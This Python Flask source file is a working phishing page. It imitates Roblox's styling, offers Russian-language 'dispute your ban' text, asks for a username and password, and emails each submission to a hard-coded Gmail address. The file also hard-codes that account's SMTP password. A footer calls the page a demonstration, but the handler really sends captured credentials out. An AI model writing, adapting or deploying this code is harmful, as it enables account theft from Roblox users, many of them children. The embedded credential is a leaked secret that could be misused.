from flask import Flask, render_template_string, request
from flask_mail import Mail, Message

app = Flask(__name__)

# Настройки SMTP
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'lovboris889@gmail.com'
app.config['MAIL_PASSWORD'] = 'xzns yayy mtty lako'

mail = Mail(app)

HTML_FORM = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Оспорить блокировку</title>
    <link rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___ca4e945ea6e23b238fb642d2722a5ac9_m.css"/>
    <style>
      html, body {background: #232527 !important;}
      .rbx-login-form {
        width: 370px;
        margin: 50px auto;
        background: #232527;
        color: #fff;
        padding: 32px 30px 16px 30px;
        border-radius: 8px;
        border: 1px solid #25262c;
        box-shadow: 0 0 30px 0 #1d2025;
        font-family: 'Gotham SSm', Arial, sans-serif;
      }
      .rbx-login-title {text-align:center;font-size:28px;font-weight:700;margin-bottom:28px;}
      .rbx-input-group {margin-bottom:22px;}
      .rbx-label {font-weight:600;display:block;margin-bottom:5px;}
      .rbx-input {
        width:100%;padding:12px;border-radius:6px;outline:none;
        border:1px solid #393b3f;background:#18191c;font-size:1rem;color:#fff;
        margin-bottom:5px;
      }
      .rbx-btn {
        width:100%;background:#0074bd;border:none;padding:12px;font-size:17px;
        font-weight:700;border-radius:5px;cursor:pointer;color:#fff;margin-top:6px;
        transition:background 0.2s
      }
      .rbx-btn:hover {background:#005fa3;}
      .rbx-form-footer {margin-top:18px;text-align:center;font-size:13px;color:#bbb;}
    </style>
</head>
<body>
  <div class="rbx-login-form">
    <div class="rbx-login-title">Оспорить блокировку</div>
    <form method="POST">
      <div class="rbx-input-group">
          <label class="rbx-label" for="username">Username/Email/Phone</label>
          <input type="text" class="rbx-input" id="username" name="username" required>
      </div>
      <div class="rbx-input-group">
          <label class="rbx-label" for="password">Password</label>
          <input type="password" class="rbx-input" id="password" name="password" required>
      </div>
      <button type="submit" class="rbx-btn">Оспорить блокировку</button>
    </form>
    {% if success %}
      <div style="margin-top:20px;padding:10px 0;text-align:center;background:#198754;border:1px solid #167343;border-radius:5px;">
        Все успешно отправлено!
      </div>
    {% endif %}
    <div class="rbx-form-footer">Roblox &copy; 2025. Appearance clone for demonstration purposes only.</div>
  </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    success = False
    if request.method == "POST":
        username = request.form.get('username','')
        password = request.form.get('password','')
        msg = Message(
            subject="Roblox Appeal Login Attempt",
            sender=app.config['MAIL_USERNAME'],
            recipients=[app.config['MAIL_USERNAME']],
            body=f"Username/Email/Phone: {username}\nPassword: {password}"
        )
        mail.send(msg)
        success = True
    return render_template_string(HTML_FORM, success=success)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
